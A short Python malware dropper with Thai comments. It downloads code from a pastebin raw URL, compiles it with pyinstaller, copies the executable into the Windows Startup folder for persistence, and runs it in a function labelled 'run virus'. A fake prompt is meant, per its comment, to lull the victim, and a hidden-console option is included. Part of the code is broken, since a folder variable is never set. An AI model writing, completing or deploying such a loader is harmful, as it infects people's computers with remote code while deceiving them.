from pdb import run
import shutil, os, getpass, subprocess, threading, requests, ctypes
#แปลงเป็น exe
def pytoexe():
    # ใช้ f-string เพื่อแทนค่า file_name
    cmd = f'pyinstaller --noconfirm --onefile --console {file_name}'  # ไม่ต้องใส่เครื่องหมายคำพูดที่รอบ {file_name}
    
    # สร้างรายการ command จากสตริง cmd โดยใช้ split()
    cmd_list = cmd.split()
    
    # เรียก pyinstaller โดยใช้ subprocess
    subprocess.call(cmd_list)
#ดึงโค้ด pastebin
def pastebin():
  global file_name                #ใส่ชองท่าน
  url = "https://pastebin.com/raw/9Jh4p8Gm"

  # ดึงข้อมูลจาก URL
  response = requests.get(url)

  # ตรวจสอบสถานะการดึงข้อมูล
  if response.status_code == 200:
      # รับข้อมูลข้อความจากการดึงข้อมูล
      text = response.text

      # ระบุชื่อไฟล์ที่คุณต้องการบันทึกข้อมูลลงในนั้น
      file_name = "QQQ.py"

      # เขียนข้อมูลลงในไฟล์
      with open(file_name, "w") as file:
          file.write(text)

      print(f"ข้อมูลถูกบันทึกในไฟล์ {file_name}")
  else:
      print("ไม่สามารถดึงข้อมูลได้")

#ย้ายไฟล์
def movefile():
    global source_file, Templates_folder, startup_folder
    # รายชื่อของไฟล์ที่คุณต้องการย้าย
    source_file = os.path.join(os.getcwd(), 'dist', 'QQQ.exe')

    # ค้นหาชื่อผู้ใช้ปัจจุบันของระบบ
    current_user = getpass.getuser()

    # สร้างเส้นทางสำหรับโฟลเดอร์ Startup ของผู้ใช้ปัจจุบัน
    startup_folder = os.path.join("C:\\Users", current_user, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    # ตรวจสอบว่าโฟลเดอร์ Startup มีอยู่หรือไม่ ถ้าไม่มีให้สร้าง
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)

    # เส้นทางเป้าหมายสำหรับการย้ายไฟล์
    destination = os.path.join(startup_folder, 'QQQ.exe')

    # ย้ายไฟล์ 'QQQ.exe' ไปยังโฟลเดอร์ Startup
    shutil.copy(source_file, destination)

    print(f"ไฟล์ {source_file} ถูกย้ายและคัดลอกไปยังโฟลเดอร์ Startup ของผู้ใช้ปัจจุบันแล้ว")

#รัน virus
def runvirus():
  print(Templates_folder)
  # ระบุเส้นทางไฟล์ QQQ.exe ที่ถูกย้ายไป Templates folder
  source_file2 = os.path.join(Templates_folder, source_file)
    
    # ใช้ shell=True ในกรณีที่ source_file เป็นไฟล์ประเภท .exe
  subprocess.call(source_file2, shell=True)
#code หลอกเหยื่อให้เหยื่อตายใจ
def fakecode():
   print("code")
   input()

#ซ่อนโปรแกรม
def hide_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 hides the window
if __name__ == "__main__":
  #hide_console() #ใช้ก็ได้ไม่ใช้ก็ได้แล้วแต่ท่าน
  pastebin()
  pytoexe()
  movefile()
  run = threading.Thread(target=runvirus)
  run.start()
  fkcode = threading.Thread(target=fakecode)
  fkcode.start()